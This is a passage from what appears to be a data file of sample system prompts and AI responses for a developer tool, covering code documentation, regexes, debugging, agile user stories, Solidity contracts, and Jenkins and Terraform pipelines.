                '\n\n## localStorage.setItem()\n\nThe `localStorage.setItem()` method allows a key-value pair to be stored in the browser\'s localStorage object.\n\n### Syntax\n```javascript\nlocalStorage.setItem(key, value);\n```\n\n- `key` : The key of the data to be stored. It is of string type.\n- `value` : The value of the data to be stored. It is of string type.\n\n\n## Parameters\n\n#### key\nA string containing the name of the key used to store the data.\n\n#### value\nA string containing the value to store under the given key.\n\n\n## Usage\n\nThe code snippet creates four items in the localStorage object.\n\n```javascript\nlocalStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");\n```\n\nThe above code creates the following key-value pairs in localStorage.\n\n"age" -> "30" \\\n"name" -> "John" \\\n"email" -> "john@gmail.com" \\\n"token" -> "abc123" \n\nWe can now retrieve this data later using localStorage.getItem() method by using the corresponding keys. \n\n```javascript\nlocalStorage.getItem("name"); // returns "John"\nlocalStorage.getItem("age"); // returns "30"\nlocalStorage.getItem("email"); // returns "john@gmail.com"\nlocalStorage.getItem("token"); // returns "abc123"\n```\n\n## Note\n\nUsing the same key again to set the value in the localStorage object will override the previous value.',
            },
          },
          {
            request: [
              {
                content: 'Create documentation for the next code',
                role: 'system',
              },
              {
                content:
                  '\n\n```\nlet decimalNumber = prompt("Enter a decimal number:"); \nlet num = decimalNumber; \nlet romanNumerals = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]; \nlet decimalValue = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; \nlet romanNumber = ""; \n\nfor(let i=0; i<decimalValue.length;i++){\n  while(decimalValue[i]<=num){ \n    romanNumber += romanNumerals[i]; \n    num -= decimalValue[i]; \n  }\n}\n\nconsole.log(decimalNumber + " in roman numerals is: " + romanNumber);\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n# Decimal to Roman Numeral Converter\n\nThis code is a JavaScript program that converts a decimal (base 10) number to a Roman numeral. The program takes a decimal number from the user as input using the prompt function in JavaScript. The decimal number is then stored in the variable decimalNumber.\n\nTwo arrays are defined in the program, romanNumerals and decimalValue. The romanNumerals array contains the Roman numeral symbols and the decimalValue array contains the corresponding decimal values.\n\nThe program then initializes the num variable to the value of decimalNumber and the romanNumber variable to an empty string.\n\nNext, a for loop is used to iterate through the decimalValue array. Within the loop, a while loop is used to add the corresponding Roman numeral to the romanNumber variable while the decimal value is less than or equal to the num value.\n\nAfter the for loop completes, the program prints the original decimal number entered by the user along with the converted Roman numeral string.\n\n### Example\n\n```\nEnter a decimal number: 1234\n1234 in roman numerals is: MCCXXXIV\n```\n\nThis program can be useful whenever you need to convert a decimal number to Roman numerals.',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'Regular Expression',
        examples: [
          {
            request: [
              {
                content: 'Only write the regular expression with no explanation.',
                role: 'system',
              },
              {
                content: 'Write a regular expression that extracts all dates from a text file.',
                role: 'user',
              },
            ],
            response: {
              content: '\\d{1,2}/\\d{1,2}/\\d{4}',
            },
          },
          {
            request: [
              {
                content: 'Only write the regular expression with no explanation.',
                role: 'system',
              },
              {
                content:
                  'Write a regular expression that the username can contain letters, numbers, underscores, and dots. The username must start with a letter or a number. The domain can contain letters, numbers, underscores, and dots. The domain must have at least one dot and have a valid domain extension of 2 to 6 characters.',
                role: 'user',
              },
            ],
            response: {
              content: '^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'REGEX Explain',
        examples: [
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: '\\d{1,2}/\\d{1,2}/\\d{4}',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a date string in the format of MM/DD/YYYY, where:\n\n- \\d{1,2} matches one or two digits representing the month (MM).\n- / matches a forward-slash character between the month and day.\n- \\d{1,2} matches one or two digits representing the day (DD).\n- / matches another forward-slash character between the day and year.\n- \\d{4} matches four digits representing the year (YYYY).\n\nOverall, this regular expression matches a wide range of possible dates, allowing for single or double-digit months and days, and four-digit years.',
            },
          },
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: 'Regular Expression (^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$)',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a valid email address with the following conditions:\n\n- ^ and $ indicate the start and end of the string respectively, ensuring that the entire string matches the pattern.\n- [a-zA-Z0-9] matches a single character that can be any uppercase or lowercase alphabet or any digit.\n- [a-zA-Z0-9_.]* matches zero or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- @ matches a literal at sign.\n- [a-zA-Z0-9_.]+ matches one or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- \\. matches a literal dot.\n- [a-zA-Z]{2,6} matches any two to six uppercase or lowercase alphabets at the end of the string, specifying the top-level domain.\n\nPut together, this expression matches valid email addresses with one or more alphanumeric characters, followed by an @ symbol, an alphanumeric domain name with optional periods and underscores, and a valid top-level domain ending in two to six alphabets.',
            },
          },
        ],
      },
      {
        shortTitle: 'DC',
        title: 'Debug Code',
        examples: [
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content: 'X=7 \nif x = 7 \n print(\'this number is 7\') \n else: \n print(\'this number is not 7\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'No, the code is not correct. There are a few errors: \n\n1. The variable name is inconsistent. In the first line, it\'s `X` (capital) but in the if statement, it\'s `x` (lowercase). Variable names are case-sensitive in Python, so you need to be consistent. \n\n2. The if statement needs a colon (`:`) at the end. \n\n3. The comparison operator used in the if statement is the assignment operator (`=`) instead of the equality operator (`==`). \n\nHere\'s the corrected code: \n\n```\nx = 7\nif x == 7:\n    print(\'this number is 7\')\nelse:\n    print(\'this number is not 7\')\n```',
            },
          },
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content: 'X=7 \nif x = 7 \n print(\'this number is 7\') \n else: \n print(\'this number is not 7\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'No, the code is not correct. There are a few errors: \n\n1. The variable name is inconsistent. In the first line, it\'s `X` (capital) but in the if statement, it\'s `x` (lowercase). Variable names are case-sensitive in Python, so you need to be consistent. \n\n2. The if statement needs a colon (`:`) at the end. \n\n3. The comparison operator used in the if statement is the assignment operator (`=`) instead of the equality operator (`==`). \n\nHere\'s the corrected code: \n\n```\nx = 7\nif x == 7:\n    print(\'this number is 7\')\nelse:\n    print(\'this number is not 7\')\n```',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-agile-organizations--',
    mode: [
      {
        shortTitle: 'US',
        title: 'User Story',
        examples: [
          {
            request: [
              {
                content: 'Respond as if you were a product owner',
                role: 'system',
              },
              {
                content: 'create a user story for login',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a user, I want to be able to log into my account so that I can access my personalized content and settings. I should be able to enter my username and password, and then receive confirmation that I have successfully logged in. If I enter incorrect login credentials, I should be prompted to try again or reset my password. Additionally, I should be able to remain logged in if I close and reopen the app or website, but have the option to log out if I need to.',
            },
          },
          {
            request: [
              {
                content: 'Respond as if you were a product owner',
                role: 'system',
              },
              {
                content: 'create a user story for add product to the cart',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a shopper, I want to be able to add products to my shopping cart so that I can easily keep track of the items I want to purchase and proceed to checkout when I\'m ready. When I browse through the website, I should be able to find a button or link next to each product that allows me to add it to the cart. Once I click on the button, the selected product should be logged in my cart and I should be able to view the total price of my selected items. Additionally, I should be able to add multiple quantities of the same product or remove products from the cart if I change my mind.',
            },
          },
        ],
      },

      {
        shortTitle: 'GH',
        title: 'US Gherkin',
        examples: [
          {
            request: [
              {
                content: 'Respond using Gherking and Feature and scenario',
                role: 'system',
              },
              {
                content: 'create a user story for login',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n**Feature:** Login functionality \n\nAs a registered user of the system, I want to be able to log in with my username and password in order to access the system.\n\n**Scenario 1:** Successful login\n\nGiven I am on the homepage\nWhen I click on the "Login" button\nAnd I enter my username and password\nAnd I click on the "Login" button\nThen I should be redirected to my account page.\n\n**Scenario 2:** Unsuccessful login\n\nGiven I am on the homepage\nWhen I click on the "Login" button\nAnd I enter an invalid username or password\nAnd I click on the "Login" button\nThen I should see an error message indicating that my login credentials are incorrect.\n\n**Scenario 3:** Forgotten password\n\nGiven I am on the login page\nWhen I click on the "Forgot password" link\nAnd I enter my email address\nAnd I click on the "Reset password" button\nThen I should receive an email with instructions on how to reset my password.',
            },
          },
          {
            request: [
              {
                content: 'Respond using Gherking and Feature and scenario',
                role: 'system',
              },
              {
                content: 'create a user story for add product to the cart',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nFeature: Add product to cart\nScenario: Add a product to the cart\nGiven I am on the product\'s page\nWhen I select "Add to Cart"\nThen the product is added to my cart\nAnd I see a notification that the product has been added to my cart. \n\nScenario: Increase product quantity in cart\nGiven I have added a product to my cart\nWhen I increase the quantity of the product in my cart\nThen the quantity of the product is updated in my cart\n\nScenario: Remove product from cart\nGiven I have added a product to my cart\nWhen I select "remove" button for the product in my cart\nThen the product is removed from my cart\nAnd the updated cart reflects the removal of the product.',
            },
          },
        ],
      },
      {
        shortTitle: 'AC',
        title: 'Acceptance Criteria',
        examples: [
          {
            request: [
              {
                content: 'Respond the acceptance criteria for the next US, it must be very specific',
                role: 'system',
              },
              {
                content: 'create a user story for login',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.\n\nAcceptance criteria:\n- The user needs to be able to navigate to the login screen from the landing page.\n- The user needs to be able to input their email and password into the appropriate fields.\n- Upon successful login, the user should be redirected to the home page of the application.\n- The user should receive an error message if their email or password is incorrect.\n- The application should remember the user\'s login credentials and keep them logged in after closing and re-opening the application.\n- There should be a "Forgot Password" option that allows users to reset their password through email verification.\n- The user\'s password should be securely encrypted and stored in a database.\n- The login feature should be tested thoroughly to ensure that it works in all supported browsers and under different network conditions.',
            },
          },
          {
            request: [
              {
                content: 'Respond the acceptance criteria for the next US, it must be very specific',
                role: 'system',
              },
              {
                content: 'create a user story for add product to the cart',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a customer, I want to be able to add a product to my cart so that I can purchase it later.\n\nAcceptance Criteria:\n1. When a user clicks on the "Add to Cart" button, the product should be added to the cart.\n2. The cart should display the updated number of items and the total cost of the items added.\n3. The user should be able to add multiple items to the cart.\n4. The user should be able to remove items from the cart.\n5. The user should be able to update the quantity of a particular item in the cart.\n6. If a user tries to add a product to the cart that is out of stock, an appropriate error message should be displayed.\n7. If a user tries to add a product to the cart that is already in the cart, the cart should update the quantity of the item.\n8. The cart should be accessible from any page on the website.\n9. The user should be able to proceed to checkout from the cart page.',
            },
          },
        ],
      },
      {
        shortTitle: 'SP',
        title: 'Story Points',
        examples: [
          {
            request: [
              {
                content: 'Respond the story points for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'I would estimate this user story to be a 3 in story points. While it is an essential feature for any application that requires authentication, it is a relatively straightforward task that can be completed in a few hours. However, if there are additional requirements such as integrating with a third-party authentication provider or implementing two-factor authentication, then the story points may increase.',
            },
          },
          {
            request: [
              {
                content: 'Respond the story points for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'The story points for this user story would depend on the complexity of the implementation. However, based on the given information, I would estimate that this user story could be completed in 2 to 5 story points, assuming the following:\n\n- The website already has some basic functionality for adding products to a cart.\n- The implementation involves adding a simple "Add to Cart" button to each product page and updating the cart count and total cost appropriately.\n- No complex business rules or integration with external systems are required.',
            },
          },
        ],
      },
      {
        shortTitle: 'AB',
        title: 'A/B Testing',
        examples: [
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'A/B testing: \n\nA) Traditional login method where users enter their email and password into a login form and click a button to authenticate their credentials.\n\nB) Social media login method where users can choose to log in using their social media account credentials (e.g. Facebook, Google, Twitter). \n\nThe A/B testing will measure which method generates more logins, higher user engagement, and user satisfaction.',
            },
          },
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'As an A/B testing variation for this user story, we can test the placement and design of the "Add to Cart" button. In variation A, the "Add to Cart" button can be placed prominently in the center of the product page with a contrasting color to make it stand out. This could help attract the user\'s attention and make it easier for them to add products to their cart.\n\nIn variation B, we could move the "Add to Cart" button to a less prominent location, such as in the corner of the product page. This could test if users are more likely to add products to their cart if they have to actively search for the button, rather than having it prominently displayed.\n\nWe can then track metrics such as the number of products added to the cart, the click-through rate on the "Add to Cart" button, and the conversion rate to determine which variation is more effective.',
            },
          },
        ],
      },
      {
        shortTitle: 'KM',
        title: 'KPI',
        examples: [
          {
            request: [
              {
                content: 'What are the key performance metrics for the next UX',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThe key performance metrics for the next UX iteration focusing on the log-in feature could include:\n\n1. Conversion rate: Measure the percentage of users who successfully log in after entering their email and password. This will help determine whether the log-in process is smooth and user-friendly.\n\n2. Error rate: Measure the frequency and type of errors users experience when attempting to log in. With this metric, you can identify areas of the log-in process that may be causing confusion or frustration for users.\n\n3. Time to complete: Measure the amount of time it takes users to log in, from entering their email and password to accessing the app\'s features. If it takes too long to complete the log-in process, users may abandon the app entirely.\n\n4. User engagement: Measure the number of times users access the app\'s features and functions after successfully logging in. This indicates whether the log-in process is not only successful but also encourages users to continue using the app.\n\nBy tracking these metrics, you can identify areas for improvement in the log-in process and ensure that the UX delivers the best possible experience for users.',
            },
          },
          {
            request: [
              {
                content: 'What are the key performance metrics for the next UX',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nHere are some key performance metrics for the next UX related to adding a product to the cart:\n\n1. Conversion rate: This measures the percentage of users who successfully add a product to their cart and go on to complete their purchase. A high conversion rate indicates a smooth and intuitive cart experience.\n\n2. Cart abandonment rate: This measures the percentage of users who add a product to their cart but do not complete their purchase. A low cart abandonment rate indicates a frictionless cart experience.\n\n3. Time to add a product: This measures the time it takes for a user to add a product to their cart. A quick and easy process will result in a shorter time to add a product.\n\n4. Cart accuracy: This measures the accuracy of cart item pricing, quantity, and availability to ensure that users are not surprised when they get to the checkout page.\n\n5. User satisfaction: This measures how satisfied users are with the cart experience overall through surveys, feedback, or Net Promoter Score (NPS) to identify areas of improvement.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-blockchain--',
    mode: [
      {
        shortTitle: 'SC',
        title: 'Smart Contract',
        examples: [
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  'write a simple smart contract that allows someone to store and retrieve a single integer value',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\npragma solidity ^0.8.0;\n\ncontract SimpleStorage {\n    uint256 private _value;\n\n    function store(uint256 value) public {\n        _value = value;\n    }\n\n    function retrieve() public view returns (uint256) {\n        return _value;\n    }\n}\n```',
            },
          },
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write a basic NFT contract in solifity',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\npragma solidity ^0.8.0;\n\n// Import OpenZeppelin contracts\nimport "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";\nimport "@openzeppelin/contracts/utils/Counters.sol";\n\ncontract MyNFT is ERC721URIStorage {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721("MyNFT", "MNFT") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newNftTokenId = _tokenIds.current();\n        _mint(recipient, newNftTokenId);\n        _setTokenURI(newNftTokenId, tokenURI);\n\n        return newNftTokenId;\n    }\n}\n```',
            },
          },
        ],
      },

      {
        shortTitle: 'EM',
        title: 'Explain Me',
        examples: [
          {
            request: [
              {
                content: 'explain me as a developer the next question',
                role: 'system',
              },
              {
                content: 'What is the role of Smart Contracts in blockchain technology?',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nAs a developer, you should be familiar with Smart Contracts and their pivotal role in Blockchain technology. Smart Contracts are self-executing agreements that execute the terms of the agreement between the parties involved. These contracts are written in code and are stored on the Blockchain network. Their main objective is to provide trust and security between parties without involving intermediaries such as middlemen or legal experts.\n\nAs a developer, you can create Smart Contracts using various programming languages such as Solidity, which is specifically designed to create Smart Contracts on the Ethereum Blockchain. Once the Smart Contract is deployed on the Blockchain, it is immutable and cannot be modified, giving it the added security of not being manipulated.\n\nSmart Contracts function as the backbone of decentralized applications (DApps) built on the Blockchain network. They facilitate the creation of various use cases such as supply chain management, digital identity management, and decentralized finance (DeFi).\n\nIn summary, Smart Contracts play a crucial role in ensuring the transparency, security, and decentralization of Blockchain technology. As a developer, mastering the art of developing Smart Contracts is an essential skill to enable you to build decentralized applications.',
            },
          },
          {
            request: [
              {
                content: 'explain me as a developer the next question',
                role: 'system',
              },
              {
                content: 'What is Blockchain and how does it work in blockchain technology?',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nBlockchain is a decentralized and distributed digital ledger technology that allows secure and transparent peer-to-peer transactions without the need for intermediaries. It is a continuously growing list of records or blocks that are linked and secured using cryptography. Each block contains a unique code or hash that identifies the previous block, making it virtually impossible to tamper with the data stored in the blockchain.\n\nIn blockchain technology, transactions are verified and recorded by multiple users or nodes in the network. This consensus mechanism ensures that transactions are validated and approved by the network before they are added to the blockchain. Once added, the transactions are immutable and cannot be altered, creating a transparent and secure record of all transactions.\n\nBecause blockchain is decentralized, there is no central authority controlling the network, which makes it resistant to hacking, fraud, and corruption. This technology has the potential to revolutionize industries such as finance, healthcare, supply chain management, and more by providing a secure and transparent way to record and verify transactions.',
            },
          },
        ],
      },
      {
        shortTitle: 'EC',
        title: 'Explain Code',
        examples: [
          {
            request: [
              {
                content: 'explain me as a developer the next code',
                role: 'system',
              },
              {
                content:
                  '\n\n```\npragma solidity ^0.8.0;\n\ncontract SimpleStorage {\n    uint256 private _value;\n\n    function store(uint256 value) public {\n        _value = value;\n    }\n\n    function retrieve() public view returns (uint256) {\n        return _value;\n    }\n}\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis code is a Solidity smart contract called "SimpleStorage". It has two functions: "store" and "retrieve". The contract is written in version 0.8.0 of Solidity.\n\nThe "store" function takes a parameter "value" of type uint256 (unsigned integer of 256 bits) and sets the contract\'s private variable "_value" to that value. The function is public, which means anyone can call it.\n\nThe "retrieve" function is a public view function, which means it can be called by anyone and it doesn\'t modify the state of the contract. It returns the value of "_value".\n\nIn summary, this contract provides a simple way to store and retrieve a single unsigned integer value on the blockchain.',
            },
          },
          {
            request: [
              {
                content: 'Explain me the next code',
                role: 'system',
              },
              {
                content:
                  '\n\n```\npragma solidity ^0.8.0;\n\n// Import OpenZeppelin contracts\nimport "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";\nimport "@openzeppelin/contracts/utils/Counters.sol";\n\ncontract MyNFT is ERC721URIStorage {\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIds;\n\n    constructor() ERC721("MyNFT", "MNFT") {}\n\n    function mintNFT(address recipient, string memory tokenURI)\n        public\n        returns (uint256)\n    {\n        _tokenIds.increment();\n\n        uint256 newNftTokenId = _tokenIds.current();\n        _mint(recipient, newNftTokenId);\n        _setTokenURI(newNftTokenId, tokenURI);\n\n        return newNftTokenId;\n    }\n}\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                'he code defines a Solidity smart contract that implements an ERC721 non-fungible token (NFT) standard with a URI storage extension. \n\nThe contract inherits from the `ERC721URIStorage` contract provided by the OpenZeppelin library, which implements the standard ERC721 interfaces for managing unique tokens with metadata.\n\nThe `Counters` library is imported from OpenZeppelin as well, which provides a simple way to manage sequential numbering of token IDs.\n\nThe `MyNFT` contract has a `mintNFT` function that takes an `address` `recipient` and a `string` `tokenURI` as inputs. The function creates a new NFT with a unique token ID by incrementing the `_tokenIds` counter, which starts at 0. The new token is then minted to the specified recipient address, and its metadata URI is set to the given tokenURI. Finally, the function returns the new token ID.\n\nThe `constructor` function is used to initialize the `MyNFT` contract and sets the name `MyNFT` and symbol `MNFT` for the ERC721 token.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-cloud-ops--',
    mode: [
      {
        shortTitle: 'JE',
        title: 'Jenkins',
        examples: [
          {
            request: [
              {
                content: 'Please respond the next question as a DevOps Cloud Engineer',
                role: 'system',
              },
              {
                content: 'generate a sample jenkins ci cd pipeline for a calculator app',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a sample Jenkins CI/CD pipeline for a calculator app:\n\n1. `Checkout`: Clone the codebase from the repository.\n2. `Build`: Build the calculator app. For instance, this can be done using Maven or Gradle.\n3. `Unit Test`: Run unit tests for the calculator app.\n4. `Code Coverage`: Measure code coverage of the unit tests.\n5. `Lint`: Check for any code style, formatting or syntax issues.\n6. `Package`: Package the built and tested application into a deployable artifact, such as a JAR or WAR.\n7. `Deployment`: Deploy the package to the target environment. For example, you can use AWS Elastic Beanstalk or Kubernetes.\n8. `Test`: Run automated acceptance tests on the deployed app.\n9. `Code Analysis`: Perform static code analysis on the source code to identify potential issues.\n10. `Security Scan`: Perform security scanning of the built package.\n11. `Release`: If all tests and scans pass successfully, promote the artifact for release.\n12. `Rollback`: Rollback to the previous version in case something goes wrong during any stage of the pipeline.\n\nThis pipeline can be configured to run automatically on every code change, ensuring that the application is tested, packaged and deployed to the production environment in a consistent and reliable manner.',
            },
          },
          {
            request: [
              {
                content: 'Please respond the next question as a DevOps Cloud Engineer',
                role: 'system',
              },
              {
                content: 'generate a pipeline code for a calculator app',
                role: 'user',
              },
            ],
            response: {
              content:
                'pipeline {\n  agent any\n  stages {\n    stage(\'Build\') {\n      steps {\n        // build the calculator app\n        sh \'mvn clean package\'\n      }\n    }\n    stage(\'Test\') {\n      steps {\n        // test the calculator app\n        sh \'mvn test\'\n      }\n    }\n    stage(\'Deploy\') {\n      steps {\n        // deploy the calculator app to production environment\n        sh \'kubectl apply -f calculator-app.yaml\'\n      }\n    }\n  }\n',
            },
          },
        ],
      },

      {
        shortTitle: 'GC',
        title: 'Google Cloud',
        examples: [
          {
            request: [
              {
                content:
                  'Please respond the next question as a DevOps Cloud Engineer. Only response with code. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write terraform code to create a bucket in google cloud',
                role: 'user',
              },
            ],
            response: {
              content:
                '```\nprovider "google" {\n  project = "your_project_name"\n  region  = "your_preferred_region"\n}\n\nresource "google_storage_bucket" "bucket_name" {\n  name          = "your_bucket_name"\n  location      = "your_bucket_location"\n  storage_class = "your_preferred_storage_class"\n  uniform_bucket_level_access = true\n}\n```',
            },
          },
          {
            request: [
              {
                content:
                  'Please respond the next question as a DevOps Cloud Engineer. Only response with code. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write terraform code to create a MIG VM with load balancer',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nHere\'s an example Terraform configuration that creates a Managed Instance Group (MIG) with a load balancer in Google Cloud Platform (GCP):\n\n```\n# Configure provider\nprovider "google" {\n  project = "<GCP_PROJECT_ID>"\n  region  = "us-central1"\n}\n\n# Create instance template\nresource "google_compute_instance_template" "example_template" {\n  name                    = "example-template"\n  description             = "Instance template for MIG"\n  machine_type            = "n1-standard-1"\n  boot_disk_auto_delete   = "true"\n  label_fingerprint       = "xyz"\n\n  network_interface {\n    network = "default"\n  }\n\n  disk {\n    source_image = "debian-cloud/debian-9"\n  }\n\n  metadata = {\n    ssh-keys = "user:${file("~/.ssh/id_rsa.pub")}"\n  }\n\n  service_account {\n    scopes = ["cloud-platform"]\n  }\n}\n\n# Create instance group manager\nresource "google_compute_instance_group_manager" "example_group" {\n  name                        = "example-group"\n  base_instance_name          = "example"\n  instance_template           = google_compute_instance_template.example_template.id\n  zone                        = "us-central1-a"\n  target_size                 = 1\n\n  version {\n    name = "example-version"\n  }\n\n  named_port {\n    name = "http"\n    port = 8080\n  }\n}\n\n# Create health check\nresource "google_compute_http_health_check" "example_health_check" {\n  name                 = "example-health-check"\n  check_interval_sec   = 5\n  timeout_sec          = 5\n  unhealthy_threshold  = 2\n  healthy_threshold    = 2\n  request_path         = "/"\n  port                 = "8080"\n}\n\n# Create backend service\nresource "google_compute_backend_service" "example_backend_service" {\n  name                       = "example-backend-service"\n  health_checks              = [google_compute_http_health_check.example_health_check.self_link]\n  protocol                   = "HTTP"\n  port_name                  = "http"\n  timeout_sec                = 10\n\n  backend {\n    group = google_compute_instance_group_manager.example_group.instance_group\n  }\n\n  load_balancing_scheme = "EXTERNAL"\n}\n\n# Create forwarding rule\nresource "google_compute_forwarding_rule" "example_forwarding_rule" {\n  name                  = "example-forwarding-rule"\n  load_balancing_scheme = "EXTERNAL"\n  port_range            = "80-80"\n  backend_service       = google_compute_backend_service.example_backend_service.id\n  ip_address            = ""\n}\n\n```\n\nThis creates an instance template, instance group manager, health check, backend service, and forwarding rule for a MIG with a load balancer. The example uses a Debian image, but you can change the image to any other image that GCP provides. The example also uses HTTP, but you can change the protocol to HTTPS or TCP, depending on your needs.',
            },
          },
        ],
      },
      {
        shortTitle: 'RF',
        title: 'Readme File',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'generate a readme file for the jenkins pipeline for a caculator app',
                role: 'user',
              },
            ],
            response: {
              content:
                '# Calculator App Jenkins Pipeline\n\nThis is a Jenkins pipeline for building and deploying a Calculator app. \n\n## Prerequisites\n\n- Jenkins server installed and configured\n- Git installed\n- Docker installed\n\n## Getting Started\n\nTo use this pipeline, follow these steps:\n\n1. Clone the Calculator app repository to your local machine.\n2. Create a new pipeline in Jenkins and configure it to use this pipeline script.\n3. Update the variables in the pipeline script to match your environment.\n4. Run the pipeline.\n\n## Pipeline Stages\n\nThis pipeline has four stages:\n\n### 1. Checkout\n\nThis stage checks out the Calculator app repository from Git.\n\n### 2. Build\n\nThis stage builds the Docker image for the Calculator app.\n\n### 3. Test\n\nThis stage runs the automated tests for the Calculator app.\n\n### 4. Deploy\n\nThis stage deploys the Calculator app to production.\n\n## Pipeline Variables\n\nThis pipeline uses the following environment variables:\n\n- `GIT_REPO_URL`: The URL of the Calculator app repository.\n- `DOCKER_IMAGE_NAME`: The name of the Docker image to build.\n- `DOCKER_IMAGE_TAG`: The tag for the Docker image.\n- `DOCKER_REGISTRY_URL`: The URL of the Docker registry to push the image to.\n- `PRODUCTION_SERVER_IP`: The IP address of the production server to deploy the app to.\n- `PRODUCTION_SERVER_USERNAME`: The username for the production server.\n- `PRODUCTION_SERVER_PASSWORD`: The password for the production server.\n\n## Conclusion\n\nThis Jenkins pipeline provides a streamlined way to build and deploy the Calculator app. By following the steps above, you can quickly get started with continuous integration and deployment for your own apps. Happy coding!',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'generate a readme file for the jenkins pipeline for a eccomerce web',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a sample README file for your Jenkins pipeline for an eCommerce web application:\n\n# Jenkins Pipeline for eCommerce Web Application\n\nThis Jenkins pipeline takes care of building, testing, and deploying an eCommerce web application. The pipeline is designed to be easy to use, easy to automate, and can be customized to fit your specific needs.\n\n## Pipeline Overview\n\nThe pipeline consists of the following stages:\n\n### Checkout\n\nThis stage checks out the source code from your repository.\n\n### Build\n\nThis stage builds the web application using Maven.\n\n### Test\n\nThis stage runs unit tests and integration tests to ensure the application is working as expected.\n\n### Package\n\nThis stage packages the application into a WAR file.\n\n### Deploy\n\nThis stage deploys the application to a target environment.\n\n## Configuration\n\nThe pipeline can be configured using environment variables. These variables can be set in Jenkins or in a `.env` file:\n\n- `APP_NAME`: The name of the application.\n- `GIT_REPO`: The URL of the Git repository.\n- `GIT_BRANCH`: The Git branch to build from.\n- `MVN_ARGS`: Additional Maven arguments to use during the build.\n- `TEST_ARGS`: Additional test arguments to use during the test stage.\n- `DEPLOY_USER`: The username to use when deploying the application.\n- `DEPLOY_PASSWORD`: The password to use when deploying the application.\n\n## Usage\n\nTo use the pipeline, simply create a new Jenkins job using the `Jenkinsfile` in the root of the repository. The pipeline will automatically run through the stages outlined above.\n\nIf you need to customize the pipeline, you can modify the `Jenkinsfile` to fit your specific needs. You can also modify the environment variables to change the behavior of the pipeline.\n\n## License\n\nThis pipeline is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.',
            },
          },
        ],
      },
      {
        shortTitle: 'BP',
        title: 'Best Practices',
        examples: [
          {
